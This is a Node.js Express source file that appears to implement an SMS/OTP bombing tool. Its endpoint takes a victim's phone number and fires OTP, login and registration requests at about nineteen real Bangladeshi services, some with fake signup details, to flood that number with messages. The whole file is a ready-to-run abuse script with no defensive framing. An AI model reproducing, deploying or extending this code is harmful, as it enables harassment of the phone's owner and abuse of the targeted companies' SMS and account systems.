const express = require("express"); const axios = require("axios"); const app = express();

app.get("/api", async (req, res) => { const num = req.query.num; const results = [];

if (!num) return res.status(400).json({ error: "Missing number (?num=)" });

const tryPostJson = async (name, url, jsonData = {}, headers = {}) => { try { const response = await axios.post(url, jsonData, { headers }); results.push({ [name]: response.data }); } catch (err) { results.push({ [name]: err.message }); } };

const tryPostForm = async (name, url, formData = {}, headers = {}) => { try { const params = new URLSearchParams(formData); const response = await axios.post(url, params, { headers }); results.push({ [name]: response.data }); } catch (err) { results.push({ [name]: err.message }); } };

const tryGet = async (name, url, headers = {}) => { try { const response = await axios.get(url, { headers }); results.push({ [name]: response.data }); } catch (err) { results.push({ [name]: err.message }); } };

await tryPostForm("gp", "https://webloginda.grameenphone.com/backend/api/v1/otp", { msisdn: num }, { "Content-Type": "application/x-www-form-urlencoded" });

await tryPostJson("robi", "https://www.robi.com.bd/en", [{ msisdn: num }]);

await tryGet("bikroy", https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${num});

await tryPostJson("apex4u", "https://api.apex4u.com/api/auth/login", { phoneNumber: num });

await tryPostJson("bdtickets_user", "https://api.bdtickets.com:20100/v1/user", { phoneNumber: "+88" + num, firstName: "Rafi", lastName: "Sarker", applicationChannel: "WEB_APP", locale: "EN" });

await tryPostJson("bdtickets_auth", "https://api.bdtickets.com:20100/v1/auth", { createUserCheck: true, phoneNumber: "+88" + num, applicationChannel: "WEB_APP" });

await tryPostJson("bioscope", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", { number: "+88" + num });

await tryPostJson("sundarban", "https://api-gateway.sundarbancourierltd.com/graphql", { operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: num } }, query: mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } } });

await tryPostJson("chokrojan", "https://chokrojan.com/api/v1/passenger/login/mobile", { mobile_number: num });

await tryPostForm("daktare", "https://www.daktare.com/login/mobile", { mobile: num }, { "Content-Type": "application/x-www-form-urlencoded" });

await tryPostJson("deeptoplay", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", { number: "+88" + num });

await tryPostJson("doctime", "https://api.doctime.com.bd/api/v2/authenticate", { country_calling_code: "88", contact_no: num, timestamp: 1754348704 });

await tryPostJson("easy", "https://core.easy.com.bd/api/v1/registration", { name: "Vv", email: "cfhcch8@gmail.com", mobile: num, password: "123456", password_confirmation: "123456", device_key: "831e1877eb5ffb6b22763444986eb70e" });

await tryPostJson("eonbazar", "https://app.eonbazar.com/api/auth/register", { mobile: num, name: "Rfi", password: "123456", email: "cfhcch8@gmail.com" });

await tryPostJson("flipper", "https://portal.flipper.com.bd/api/v1/send-otp/login", { mobile_number: num });

await tryPostJson("ghoori", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", { mobile_no: num });

await tryPostJson("hoichoi", "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", { phoneNumber: "+88" + num });

await tryPostJson("kireibd", "https://app.kireibd.com/api/v2/send-login-otp", { email: num });

await tryPostJson("quizgiri", "https://developer.quizgiri.xyz/api/v2.0/send-otp", { phone: num.slice(-10), country_code: "+880", fcm_token: null });

res.json({ number: num, results }); });

module.exports = app;

